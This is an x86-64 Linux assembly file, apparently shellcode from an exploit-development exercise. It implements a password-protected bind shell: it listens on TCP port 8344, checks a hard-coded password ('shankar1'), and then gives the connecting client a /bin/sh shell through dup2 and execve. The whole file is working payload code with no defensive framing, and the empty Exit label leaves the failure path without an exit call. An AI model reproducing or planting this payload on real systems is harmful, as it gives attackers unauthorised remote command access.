section .text
        global _start

_start:

create_socket:

        ;Create socket
        ;socket (int family, int type, int protocol)
        ;family
        xor rax, rax
        mov al, 0x29 ; 41 socket syscall ID
        mov dil, 2 ; family AF_NET
        mov sil, 1 ; type SOCK_STREAM
        syscall

struct_sockaddr:

        ;Bind Socket
        ;bind(int sockfd, struct sockaddr *my_addr,int addrlen);
        xchg rdi, rax
        xor rax, rax

        mov dword [rsp-4], eax ; INADDR_ANY
        mov word  [rsp-6], 0x9820 ; PORT 8344
        mov byte  [rsp-8], 0x2 ; AF_INET
        sub rsp, 0x8

port_bind:

        mov al, 49 ; Bind Syscall Number
        mov rsi, rsp
        mov dl, 16 ; length
        syscall

server_listen:

        ;listen
        ;(SOCK, MAX_CLIENTS) syscall for listen 50
        mov al, 50
        mov sil, 2
        syscall

client_accept:

        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
        ; syscall number 43
        mov al, 43
        sub rsp, 16
        mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp
        syscall

        ; store the client socket description

        mov r9, rax

        ; close parent

        mov al, 3
        syscall

dup2_socket:

        mov rdi, r9

        ; dup2 (new, old)
        mov rdi, r9
        mov al, 33
        xor rsi, rsi
        syscall

        mov al, 33
        add rsi, 1
        syscall

        mov al, 33
        add rsi, 1
        syscall

pass_chk:

        mov rbx,0x3172616b6e616873              ; password value shankar1
        mov rdi, r9                             ; move file descriptor to rdi
        sub rsp, 8                              ; make buffer for password length 8
        mov rsi, rsp

        xor rax, rax
        xor rdx, rdx
        add rdx, 8

        syscall
        cmp rbx, [rsi]
        jnz Exit

shell_exec:

        xor rax, rax                                ;rax to null
        push rax

        mov rbx, 0x68732f2f6e69622f                 ;push /bin//sh in reverse
        push rbx

        mov rdi, rsp                                    ; store /bin//sh address in RDI
        push rax                                        ;push null to stack

        mov rdx, rsp
        push rdi                                        ; Push address of /bin//sh

        mov rsi, rsp                                    ; set RSI

        add rax, 59                                     ; Call the Execve syscall
        syscall



Exit:
